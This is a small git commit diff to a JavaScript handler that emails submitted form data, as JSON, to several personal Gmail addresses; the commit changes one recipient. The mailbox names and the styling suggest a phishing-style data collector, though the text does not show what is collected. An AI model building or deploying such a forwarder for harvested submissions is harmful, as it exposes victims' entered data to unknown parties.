ecee2795cb893ae1b7ad783df5fe8ebb1bff0118
zm9807350 <zm9807350@gmail.com>
2026-03-02 09:33:10 +0500

    Update Aman.js

--- Aman.js
+++ Aman.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,amannizamani873@gmail.com",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,amannizamani870@gmail.com",
       subject: "Aman",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
